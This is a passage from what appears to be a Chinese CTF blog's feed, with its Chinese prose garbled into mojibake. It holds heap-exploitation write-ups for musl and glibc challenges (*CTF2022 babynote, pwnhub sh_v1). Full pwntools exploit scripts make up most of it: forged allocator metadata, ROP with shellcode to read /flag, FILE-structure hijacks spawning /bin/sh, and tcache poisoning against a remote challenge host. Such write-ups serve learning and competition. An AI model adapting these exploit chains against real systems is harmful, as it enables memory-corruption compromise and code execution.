class="hljs-number">0x1000</span> + <span class="hljs-number">8</span><br>fake_group = mmap_addr + <span class="hljs-number">0x550</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x520</span> + p64(fake_meta)<br>payload = payload.ljust(<span class="hljs-number">0xfd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(secret)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_group)<br>payload += p64(<span class="hljs-number">0</span>)<br>payload += p64((<span class="hljs-number">24</span> &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x1000</span>, payload)<br>delete(<span class="hljs-number">5</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0xfc0</span> + p64(secret) + p64(mmap_addr + <span class="hljs-number">0x1008</span>) * <span class="hljs-number">2</span> + p64(stdout - <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">3</span>) + p64((<span class="hljs-number">24</span> &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x1000</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>libc.address = libc_base<br>payload = flat([<br>    pop_rdi_ret, mmap_addr + <span class="hljs-number">0x2000</span>,<br>    pop_rsi_ret, <span class="hljs-number">0x1000</span>,<br>    pop_rdx_ret, <span class="hljs-number">7</span>,<br>    libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>],<br>    mmap_addr + <span class="hljs-number">0x2aa0</span> + <span class="hljs-number">0x40</span><br>])<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) + shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>, mmap_addr, <span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>, mmap_addr, <span class="hljs-number">0x30</span>))<br>add(<span class="hljs-number">0x1000</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">1</span>) + p64(mmap_addr + <span class="hljs-number">0x2aa0</span>) + p64(ret) + p64(<span class="hljs-number">0</span>) + p64(gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Name:&#x27;</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x800</span>).encode())<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><p>â€‹</p><p>è¿™é‡Œå¼•ç”¨å¦ä¸€ä¸ªå¸ˆå‚…çš„<a href="https://brooke-hub.github.io/2021/09/05/musl_pwn_%E5%88%9D%E6%8E%A2/">æ–‡ç« </a>å…³äºæ­¤é¢˜çš„ç–‘é—®ï¼Œè‡ªå·±å¤ç°æ—¶ä¹Ÿæœ‰è¿‡åŒæ ·çš„ç–‘é—®</p><img src="/img/12/Screenshot 2023-04-04 221257.png" style="zoom: 67%;" /><p>â€‹                                                            </p><p>ç–‘é—®1ï¼š<strong>å¯ä»¥ç›´æ¥ç”³è¯·åˆ°stdout_FILEæ˜¯å› ä¸ºavail_maskè®¾ç½®ä¸º2ï¼Œå…¶è¡¨ç¤ºçš„æ˜¯ç¬¬ä¸€ä¸ªchunkå·²ç»è¢«æ ‡è¯†ä¸ºä¸å¯åˆ†é…ï¼Œç¬¬äºŒä¸ªchunkåˆ™æ˜¯å¯ä»¥åˆ†é…ï¼Œæ‰€ä»¥å°±ç›´æ¥è¶Šè¿‡ä¸­é—´0x940ï¼Œåˆ†é…ç¬¬äºŒä¸ªchunkï¼›å¦‚æœavail_maskè®¾ç½®ä¸º3æˆ–è€…1ï¼Œåˆ™å°±å¯ä»¥æ­£å¸¸ä»å¤´å¼€å§‹åˆ†é…</strong>ã€‚</p><p>ç–‘é—®2ï¼š<strong>æ˜¯ç»•è¿‡freeçš„æ£€æŸ¥ï¼Œæ›´è¯¦ç»†ç‚¹å°±æ˜¯get_nominal_sizeå‡½æ•°ä¸­å…³äºchunkè¾¹ç•Œçš„æ£€æŸ¥</strong></p><img src="/img/12/Screenshot 2023-04-04 225810.jpg" style="zoom: 80%;" /><p>â€‹                                                                   </p><h3 id="CTF2022-babynote"><a href="#CTF2022-babynote" class="headerlink" title="*CTF2022 babynote"></a>*CTF2022 babynote</h3><p>è¿™é‡Œæ˜¯å‚è€ƒxyzmpvå¸ˆå‚…çš„<a href="https://blog.csdn.net/weixin_45209963/article/details/124423573">wp</a></p><p>å…·ä½“ç»†èŠ‚å°±ä¸å†èµ˜è¿°ï¼Œéœ€è¦æ³¨æ„åœ¨callocå‡½æ•°ä¸­ä½¿ç”¨mallocåˆ†é…å†…å­˜åä¼šç»§ç»­è°ƒç”¨is_allzeroå‡½æ•°ï¼Œè€Œåœ¨is_allzeroå‡½æ•°ä¸­åˆå­˜åœ¨get_metaå‡½æ•°å»æ£€æŸ¥æ‰€åˆ†é…çš„å†…å­˜å—ï¼Œéœ€è¦å…ˆdequeueå»å°†ç›®æ ‡å†…å­˜çš„groupæ”¹ä¸ºæ­£ç¡®çš„å†…å­˜åœ°å€ï¼Œä¹‹åæ‰èƒ½æ­£å¸¸åˆ†é…ç›®æ ‡åœ°å€ã€‚</p><p>â€‹                </p><p>åˆ©ç”¨dequeueå»æ”»å‡»ï¼Œé™¤äº†ä¼ªé€ prev,ã€nextã€avail_maskã€ freed_maskè¿™äº›å€¼ï¼Œ<strong>freeableå’Œmaplenä¹Ÿä¸èƒ½å¿½è§†</strong>ã€‚</p><p>åªæœ‰freeable &#x3D; 1æ—¶ï¼Œmetaæ‰èƒ½è¢«dequeueã€‚</p><p>å½“maplen &#x3D; 0æ—¶ï¼Œè¯´æ˜groupä¸æ˜¯æ–°mmap å‡ºæ¥çš„ï¼Œè€Œæ˜¯ä½¿ç”¨å…¶ä»–metaé‡Œçš„groupï¼›ä½¿ç”¨æœ€ç®€å•çš„ä»£ç å°±èƒ½è¯æ˜è¿™ä¸€ç‚¹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> *p = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨malloc(0x20)ä¹‹å‰æ˜¯æ²¡æœ‰ç›¸åº”0x30å¤§å°çš„group</p><img src="/img/12/Screenshot 2023-04-05 120207.png" style="zoom: 67%;" /><p>â€‹</p><p>åœ¨mallocåå¯ä»¥è§‚å¯Ÿåˆ°active[2]çš„groupå®é™…ä¸Šæ˜¯ç›´æ¥ä»active[15]ä¸­åˆ†é…çš„chunk</p><img src="/img/12/Screenshot 2023-04-05 120251.jpg" style="zoom:67%;" /><p>è€Œåœ¨åˆ©ç”¨dequeueå»æ”»å‡»æ—¶ï¼Œå¦‚æœè®¾ç½®maplenä¸º0ï¼Œåœ¨dequeueä¹‹åå°±ä¼šè°ƒç”¨free_groupå‡½æ•°ï¼Œç„¶åå°±ä½¿ç”¨get_metaå¯¹ä¼ªé€ çš„groupè¿˜è¦åšä¸€ç³»åˆ—æ£€æŸ¥ï¼Œæœ€åå†å»è°ƒç”¨nontrivial_freeå‡½æ•°ï¼Œè¿™å°±å¯¹ä¼ªé€ çš„groupå’Œmetaæœ‰æ›´å¤šçš„è¦æ±‚ï¼Œå¼•èµ·ä¸å¿…è¦çš„éº»çƒ¦ã€‚</p><img src="/img/12/Screenshot 2023-04-04 232505.jpg" style="zoom: 80%;" /><p>â€‹</p><p>ç”±äºè‡ªå·±æœ¬åœ°ä½¿ç”¨çš„æ˜¯musl_1.2.2-4ï¼Œå¯¹è¿™é“é¢˜ç»™çš„libcæ— æ³•æ­£å¸¸ä½¿ç”¨å¸¦ç¬¦å·è°ƒè¯•(ä¹Ÿä¸ç¡®å®šæ˜¯ä¸æ˜¯è¿™ä¸ªåŸå› å¯¼è‡´çš„)ï¼Œä¸ºäº†æ–¹ä¾¿è‡ªå·±åšé¢˜å°±ç›´æ¥æ‹¿æœ¬åœ°çš„libcå»åšäº†ï¼Œä¸‹é¢expä»…ä¾›å‚è€ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babynote&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./babynote&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size0, content0, size1, content1</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size0).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content0)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size1).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>, content1)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, content)<br><br><span class="hljs-comment">#ç”±äºæœ¬åœ°çš„groupæ²¡æœ‰åœ¨libcé™„è¿‘çš„ï¼Œæ‰€ä»¥äº‹å…ˆåˆ†é…å¤§é‡çš„chunkï¼Œè®©groupåˆ†é…åˆ°libcé™„è¿‘</span><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(<span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;aaaaaaaa\n&#x27;</span>, <span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;c&#x27;</span> * <span class="hljs-number">0x38</span>)<br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;d&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x200</span>, <span class="hljs-string">b&#x27;d\n&#x27;</span>)<br>find(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x28:&#x27;</span>)<br><br>elf_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    elf_base += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br>elf_base -= <span class="hljs-number">0x7d10</span><br>libc_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    libc_base += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br>libc_base += <span class="hljs-number">0x1d90</span><br>stdin = libc_base + <span class="hljs-number">0xad180</span><br>stdout = stdin + <span class="hljs-number">0x100</span><br>sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>malloc_context = libc_base + <span class="hljs-number">0xad9c0</span><br><span class="hljs-comment"># print(hex(elf_base))</span><br><span class="hljs-comment"># print(hex(libc_base))</span><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x4fc0</span>) + p64(malloc_context) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>find(<span class="hljs-number">0x20</span>, payload)<br>find(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">0x38</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x28:&#x27;</span>)<br>secret = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    secret += <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>) &lt;&lt; (i * <span class="hljs-number">8</span>)<br><br>heap_addr = libc_base - <span class="hljs-number">0x6000</span><br>fake_meta = heap_addr + <span class="hljs-number">0x1008</span><br>fake_group = heap_addr + <span class="hljs-number">0x1040</span><br><br><span class="hljs-comment">#è¿™é‡Œæ˜¯ä¼ªé€ metaï¼Œç„¶åå…ˆè®©å…¶queue</span><br>last_idx, freeable, sc, maplen = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x40</span>) <br>payload += p64(secret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_group) + p64(<span class="hljs-number">0</span>) <br>payload += p64((sc &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_meta) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    find(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x5fc0</span>) + p64(fake_group + <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;f&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x20</span>, payload)<br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br><br><span class="hljs-comment">#ä¼ªé€ çš„å¦ä¸€ä¸ªmeta,åœ¨dequeueåè®©å…¶æˆä¸ºé“¾è¡¨å¤´ï¼Œä»¥åç›´æ¥åˆ†é…ç›®æ ‡åœ°å€</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x580</span>) + p64(secret) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(stdin - <span class="hljs-number">0x10</span>)<br>payload += p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">3</span>) + p64((sc &lt;&lt; <span class="hljs-number">6</span>) + <span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;g&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;e&#x27;</span> * <span class="hljs-number">0x20</span>)<br><br><span class="hljs-comment">#åˆ©ç”¨å…ˆå‰ä¼ªé€ çš„metaå·²ç»queue,å†å»ä¿®æ”¹prevå’Œnextï¼Œç„¶ååˆ©ç”¨dequeueæ”»å‡»</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x50</span>) <br>payload += p64(secret) + p64(stdin - <span class="hljs-number">0x18</span>) + p64(heap_addr + <span class="hljs-number">0x2008</span>) + p64(fake_group) + p32(<span class="hljs-number">2</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p64((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>)|(sc &lt;&lt; <span class="hljs-number">6</span>)| (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>) | <span class="hljs-number">1</span>) + p64(fake_group - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>)<br>payload += p64(fake_meta) + p32(<span class="hljs-number">1</span>) + p32(<span class="hljs-number">0</span>)<br>find(<span class="hljs-number">0x1200</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>payload = p64(elf_base + <span class="hljs-number">0x6fb0</span>) + p64(fake_group + <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x38</span>) + p64(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;h&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x20</span>, payload)<br><br>delete(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>)<br><br>payload = <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(<span class="hljs-number">1</span>)  + p64(<span class="hljs-number">0</span>) + p64(sys_addr)<br><br>add(<span class="hljs-number">0x38</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span>, <span class="hljs-number">0x80</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;option:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>â€‹</p><p>å‚è€ƒï¼š<a href="https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8">https://bbs.kanxue.com/thread-269533-1.htm#msg_header_h3_8</a></p><p><a href="https://blog.csdn.net/weixin_45209963/article/details/124423573">https://blog.csdn.net/weixin_45209963/article/details/124423573</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnhub3æœˆå…¬å¼€èµ›&amp;&amp;å†…éƒ¨èµ›</title>
    <link href="/2023/03/14/pwnhub3%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B&amp;&amp;%E5%86%85%E9%83%A8%E8%B5%9B/"/>
    <url>/2023/03/14/pwnhub3%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B&amp;&amp;%E5%86%85%E9%83%A8%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="sh-v1"><a href="#sh-v1" class="headerlink" title="sh_v1"></a>sh_v1</h1><p>æ¼æ´åœ¨å‘½ä»¤ <strong>ln</strong> ä¸­ï¼Œå®ƒä¼šç›´æ¥å¯¹å †åœ°å€å¤åˆ¶ï¼Œé€ æˆuafã€‚</p><p>è§£é¢˜æ€è·¯ï¼š</p><ul><li>åˆ©ç”¨uafï¼Œä½¿ç”¨geditä¿®æ”¹å·²ç»é‡Šæ”¾çš„chunkä¸­çš„keyï¼Œç„¶ådouble freeã€‚</li><li>ä¿®æ”¹tcacheçš„nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘tcacheçš„å¤´ï¼Œä¿®æ”¹0x290çš„æ•°é‡ä¸º7ï¼Œé‡Šæ”¾å®ƒå°±å¯ä»¥å¾—åˆ°unsorted binï¼Œè¿›ä¸€æ­¥æ³„æ¼libcåœ°å€ã€‚</li><li>ç»§ç»­ç¼–è¾‘tcacheçš„å¤´ï¼Œä¿®æ”¹0x210çš„æ•°é‡ä¸º7ï¼Œå¹¶åœ¨ç›¸åº”çš„ä½ç½®å†™å…¥__free_hookã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;sh_v1.1&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/x/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br><span class="hljs-comment">#p = process(&#x27;./sh_v1.1&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">34883</span>) <br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_command</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&gt;&#x27;</span>, content)<br><br>send_command(<span class="hljs-string">b&#x27;touch flag&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;touch flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br><br>send_command(<span class="hljs-string">b&#x27;ln flag flag1&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;ln flag flag2&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag&#x27;</span>)<br>send_command(<span class="hljs-string">b&#x27;gedit flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span>)<br>send_command(<span class="hljs-string">b&#x27;rm flag1&#x27;</span>)<br><br>send_command(<span class="hljs-string">b&#x27;cat flag2&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>send_command(<span class="hljs-string">b&#x27;touch flag&#x27;</span>)<br>p.sendline(p64(heap_addr - <span class="hljs-number">0x290</span>))<br>send_command(<span class="hljs-string">b&#x27;touch flag1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span 